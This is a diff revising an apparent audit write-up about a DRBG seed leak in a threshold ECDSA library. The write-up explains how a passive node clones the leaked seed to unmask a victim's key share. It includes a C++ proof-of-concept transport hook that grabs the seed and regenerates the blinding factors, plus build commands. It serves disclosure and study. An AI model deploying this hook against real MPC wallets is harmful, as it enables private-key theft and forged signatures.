@@ -1,37 +1,26 @@
-> **Disclosure Note:** This write-up is an educational abstraction based on a real-world audit finding. Specific vendor details, proprietary logic, and identifiable namespaces have been redacted or simulated to strictly comply with confidentiality agreements and responsible disclosure policies. The core cryptographic flaw and architectural impact remain mathematically accurate.
+Disclosure: Educational abstraction of a real-world zero-day. Vendor specifics and core namespaces are simulated. The math and architectural flaw remain 1:1 with the original exploit.
+[CRITICAL] DRBG State Leakage in Threshold ECDSA (Full Key Compromise)
+Author: Ayoub Aragui (aragui99)
+Category: Cryptographic Invariant Breach
+Language: C/C++
+Context & Invariant
+In t-of-n ECDSA setups, Oblivious Transfer (OT) phases require ephemeral entropy seeds to instantiate a local DRBG. This DRBG generates the blinding factors (v_{l,t}) that mask the user's secret key share (x_i).
+Invariant: The DRBG root seed is strictly ephemeral. It must never leave the node's isolated memory or cross the network transport layer.
+The Flaw
 
-# Architectural Flaw: DRBG State Leakage in Threshold ECDSA Leads to Full Key Compromise
+MaskedShare \equiv (x_i + v_i) \pmod q
 
-**Author:** Ayoub Aragui (aragui99)
-**Category:** State Deviation / Cryptographic Invariant Breach
-**Language:** C/C++
 
-## Structural Reconnaissance
-In Threshold ECDSA (t-of-n) architectures, Oblivious Transfer (OT) phases require the generation of highly sensitive, ephemeral entropy seeds. These seeds instantiate a Deterministic Random Bit Generator (DRBG) locally on each node. The DRBG is strictly responsible for generating the blinding factors ($v_{l,t}$) that mathematically mask the participant's secret key share ($x_i$).
+Since the attacker has the victim's leaked seed, they can spin up an identical local DRBG. v_i is no longer random; it's a known constant. The attacker simply reverses the mask
 
-**The Core Invariant:** The DRBG root seed must remain strictly ephemeral and isolated within the generating node's memory space. It must never traverse the `data_transport_i` network boundary.
 
-## The Logic Flaw (State Deviation)
-During the signature generation's broadcast phase, a severe architectural flaw occurs in the payload bundling logic (e.g., `protocol_payload::bundle_msgs(seed, v_theta)`). The core library inadvertently serializes the exact 256-bit DRBG entropy seed into the plaintext struct payload. 
+x_i \equiv (MaskedShare - v_{reconstructed}) \pmod q
 
-This payload is subsequently broadcasted to all peers across the network transport layer. The isolation invariant is completely shattered.
 
-## Mathematical Unmasking (Impact)
-By operating as a passive participating node in the MPC quorum and hooking the network transport interface (`receive_all`), an attacker extracts the victim's DRBG root seed in plaintext. 
+Impact: Complete 1-of-n compromise. The threshold is bypassed, the full private key is reconstructed, and the attacker dictates all signatures.
+PoC (Passive Transport Hook)
 
-In additive masking configurations, the signature generation relies on masking the secret share $x_i$ using the ephemeral random value $v_i$. The general algebraic structure for the masked share is:
 
-$$Masked\_Share = (x_i + v_i) \pmod q$$
-
-With the DRBG state cloned using the stolen seed, $v_i$ transitions from a random unknown variable to a known constant. The passive attacker trivially strips the masking layer:
-
-$$x_i = (Masked\_Share - v_{reconstructed}) \pmod q$$
-
-**Result:** Total 1-of-n compromise in a t-of-n schema. The attacker bypasses the threshold requirement, unilaterally reconstructs the full private key, and gains total control over the generated signatures.
-
-## Instant Execution PoC (Raw)
-
-```cpp
 #include <iostream>
 #include <vector>
 #include <cstring>
@@ -40,9 +29,9 @@ $$x_i = (Masked\_Share - v_{reconstructed}) \pmod q$$
 
 using namespace mpc_lib;
 
-class malicious_transport_t final : public data_transport_i {
+class mal_transport final : public data_transport_i {
 public:
-    explicit malicious_transport_t(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
+    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
     
     error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
         error_t rv = ctx_->receive_all(senders, msgs);
@@ -50,14 +39,16 @@ public:
 
         for (size_t i = 0; i < msgs.size(); i++) {
             if (msgs[i].size() >= 32) {
-                buf256_t stolen_seed;
-                std::memcpy(&stolen_seed, msgs[i].data(), 32); 
+                buf256_t seed;
+                std::memcpy(&seed, msgs[i].data(), 32); // grab the leaked seed
                 
-                crypto::deterministic_rng_t malicious_drbg(stolen_seed);
+                // init malicious drbg
+                crypto::deterministic_rng_t atk_drbg(seed);
                 bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
                 
-                for(int t=0; t<2; t++) {
-                    std::cout << "[*] aragui99 Audit - Expected: " << malicious_drbg.gen_bn(q).to_hex() << std::endl;
+                // boom. generate the exact blinding factors
+                for(int t = 0; t < 2; t++) {
+                    std::cout << "[*] aragui99 Audit - Expected: " << atk_drbg.gen_bn(q).to_hex() << "\n";
                 }
             }
         }
@@ -67,16 +58,9 @@ private:
     std::shared_ptr<net_context_t> ctx_;
 };
 
-Execution
 
-
-g++ -std=c++17 aragui99_tss_exploit.cpp -I./include -L./lib/Debug -lmpc_core -lcrypto -o aragui99_exploit
-./aragui99_exploit
-
-
-
-State Deviation Evidence
-Executing the PoC confirms the immediate compromise of the blinding factors via the passive transport hook. The ephemeral masking layer becomes entirely deterministic to the observer:
+Output Logs
+Running the hook passively dumps the masking variables natively:
 
 
 [*] Initializing 2 Independent Parties (Public API Entry Point)...
